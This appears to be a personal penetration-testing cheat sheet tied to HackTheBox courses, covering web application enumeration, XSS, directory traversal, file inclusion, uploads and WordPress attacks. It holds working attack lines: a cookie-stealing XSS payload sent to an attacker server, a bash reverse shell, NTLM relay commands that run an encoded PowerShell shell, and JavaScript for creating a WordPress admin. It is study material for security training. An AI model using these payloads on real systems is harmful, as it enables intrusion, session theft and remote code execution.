---
layout: blank
pagetitle: Attacking Web Applications
---

[HackTheBox - Attacking Common Applications](https://academy.hackthebox.com/module/113/section/1087)

[HackTheBox - Attacking Common Services](https://academy.hackthebox.com/module/116/section/1140)

### Enumeration
- Install Wappalyzer when doing boxes/taking test
- `gobuster`
	- Very noisy! Enumerates dirs/files
	- Usage: `gobuster dir -u {IP} -w /usr/share/wordlists/dirb/common.txt -t {threads}`
	- Make sure it checks for .git
		- https://github.com/arthaud/git-dumper to dump the info
		- https://medium.com/swlh/hacking-git-directories-e0e60fa79a36
- Check robots.txt
- Check for APIs with /FUZZ/v1 or /FUZZ/v2
- Fuzz default IIS servers!!! They can have stuff
- `whatweb` is like a local wappalyzer on kali
	- `whatweb http://{IP}`

### Exploitation
- Finding default passwords for HTTP basic auth
	- Use [LoginHunter](https://github.com/InfosecMatter/default-http-login-hunter) with a list of hosts to find things like cameras w default passwords
	- Can be very useful on internal engagements with hundreds/thousands of webservers
- HTTP Headers:
	- `HTTP User-Agent` can sometimes be displayed in logging pages, so modifying it could XSS or SQLi some sites
	- `Server` response can reveal info about server
- I guess try adding `{"admin":"True"}`  (or equivalent) against registration APIs? 
- If HttpOnly flag isn't on Auth cookies, we can steal them w/ XSS
	- `<img src=x onerror=this.src='http://yourserver/?c='+document.cookie>`

### XSS Exploitation Example
- Grabbing a nonce value from /wp-admin/user-new.php
	- var ajaxRequest = new XMLHttpRequest(); 
	- var requestURL = "/wp-admin/user-new.php"; 
	- var nonceRegex = /ser" value="(\[^"]\*?)"/g; 
	- ajaxRequest.open("GET", requestURL, false); 
	- ajaxRequest.send(); 
	- var nonceMatch = nonceRegex.exec(ajaxRequest.responseText); 
	- var nonce = nonceMatch\[1];
- Then, use that `nonce` variable with /wp-admin/user-new.php to create a new administrator

### Directory Traversal
- Test Windows traversal with `C:\Windows\System32\drivers\etc\hosts` (if win.ini not working)
- DT to system access on Windows:
	- Look in home directories for `.ssh`
	- IIS server: 
		- `C:\inetpub\logs\LogFiles\W3SVC1\` is logs
		- `C:\inetpub\wwwroot\web.config` - config w/ potential creds
- `%2f` for `/` and `%2e` for `.` 
- Also, if we can pass IPs, use for stealing NTLM hash
	- `sudo impacket-ntlmrelayx --no-http-server -smb2support -t {relay_target_IP} -c "powershell -enc {reverse_shell}"`

### File Inclusion
- Different from directory traversal - directory traversal refers to simply retrieving contents, whereas LFI means the contents of the file are executed
- LFI example attack path
	- Can access local files with ?page=
	- Apache's /var/log/apache2/access.log logs the HTTP User Agent of everyone connecting
	- Thus, we can connect to a site with php code in our User Agent, poisoning the log, and view the access log with the LFI, resulting in the code executing
	- Can turn into a reverse shell with `bash -i >& /dev/tcp/{IP}/4444 0>&1`
		- If executed with Bourne Shell, we can prepend `bash -c` to ensure shell uses bash
- PHP wrappers can be used to display PHP when it would have otherwise executed
	- php://filter/convert.base64-encode/resouce=admin.php
	- data:// wrapper can be used for code execution
		- `data://text/plain,<php echo system('ls'); ?>` in an LFI could cause RCE
		- b64 version: `data://text/plain;base64,`
- Remote File Inclusion - very similar, but rare - passing PHP file as an HTTP link
- Things to include:
	- **/var/www/html/backup.php**
	- **/opt/admin.bak.php**
	- **/opt/install.txt** (or **C:\\Users\\install.txt**)
	- **/opt/passwords**

### File Upload
- SVG upload can lead to XXE
- webshells found at /usr/share/webshells
- On boxes, try changing filename to include `../` - could upload root ssh key

### Command Injection
- ``dir 2>&1 \*\`|echo CMD);&<# rem #>echo PowerShell`` will check injected shell type
- Can use powershell for creating shells

### Wordpress
- Use `wpscan` and investigate the plugins
	- `wpscan --url http://{IP} --enumerate p --plugins-detection aggressive`
	- Look for `[!] This version is out of date`
	- Can use searchsploit for these plugins or the wpscan vuln database
- If signed into the wordpress page
	- Check out plugins from the inside
	- Check out the Backup Migration
		- Changing this to our IP can allow us to relay authentication (if signing is disabled)
		- `//{kali_ip}/test` with `sudo impacket-ntlmrelayx --no-http-server -smb2support -t {relay_target_IP} -c "powershell -enc {reverse_shell}"`
	- Try to upload a shell